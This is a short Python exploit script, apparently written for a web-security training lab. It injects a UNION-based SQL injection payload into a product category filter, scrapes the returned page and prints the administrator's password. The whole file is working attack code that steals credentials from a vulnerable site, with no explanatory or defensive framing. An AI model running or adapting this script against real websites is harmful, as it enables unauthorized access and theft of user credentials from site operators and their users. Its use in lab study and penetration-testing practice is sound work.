import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def exploit_sqli_users_table(url):
    username = 'administrator'
    path = '/filter?category=Gifts'
    payload = "' UNION select username, password from users--"
    r = requests.get(url + path + payload, verify=False, proxies=proxies)
    print(url+path+payload)
    if "administrator" in r.text:
        print("[+] Fond the administrator password.")
        soup = BeautifulSoup(r.text, 'html.parser')
        admin_password = soup.body.find(text="administrator").parent.findNext('td').contents[0]
        print("[+] The administrator password is %s" % admin_password)
        return True
    else :
        return False


if __name__ == "__main__" :
    try:
        url = sys.argv[1].strip()

    except IndexError:
        print('[-] Usage: %s <url> <payload>' % sys.argv[0])
        print('[-] Example: %s www.example.com <payload>' % sys.argv[0])
        sys.exit(-1)

print("[+] Dumping the list of the usernames and passwords ...")
if not exploit_sqli_users_table(url):
    print("[-] Did not find an administrator password")
